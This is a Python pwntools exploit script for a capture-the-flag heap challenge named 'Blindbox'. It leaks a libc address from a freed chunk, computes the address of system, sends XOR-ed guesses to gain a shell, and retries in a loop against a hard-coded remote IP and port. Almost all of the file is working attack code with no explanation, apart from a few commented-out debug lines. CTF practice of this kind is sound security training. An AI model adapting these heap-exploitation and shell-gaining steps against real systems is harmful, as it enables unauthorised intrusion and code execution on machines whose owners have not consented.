# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.update( os = 'linux', arch = 'amd64',timeout = 0.5)
binary = './Blindbox'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.31.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.93.163.42'
    port = '20713'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(size_type , index):
    cmd(1)
    sla('>>' , size_type)
    sla('Blindbox(1-3):',index)

def show(idx):
    cmd(3)
    sla(' open?',idx)

def delete(idx):
    cmd(2)
    sla(' drop?',idx)

def edit(idx,content):
    cmd(4)
    sla('change?',idx)
    sa('content:',content)

def wish(content):
    cmd(5)
    sa('wish:',content)

# one_gad = one_gadget(libc.path)

def attack():
    
    sla('name:','niyah')
    sla('number?' , 0x1f8)
    sla('number?' , 0x98)
    sla('number?' , 0xf8)

    for i in range(7):
        add(2 , 1)
        delete(1)
    # delete(2)
    add(2 , 1)
    add(2 , 2)
    delete(1)

    show(1)
    addr = l64()

    if(addr == 0):
        exit(0)

    key = [0x6b8b4567 , 0x327b23c6,0x643c9869,0x66334873 ,0x74b0dc51,0x19495cff, 0x2ae8944a,0x625558ec]
    lg('addr',addr)

    __malloc_hook = addr - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    
    cmd(6)
    for i in range(8):
        sla('guess>' ,key[i]^system_addr )

    # dbg()
    
    # p.success(getShell())
    p.interactive()

# attack()
boom(attack)

'''
@File    :   Blindbox.py
@Time    :   2021/12/11 11:40:39
@Author  :   Niyah 
'''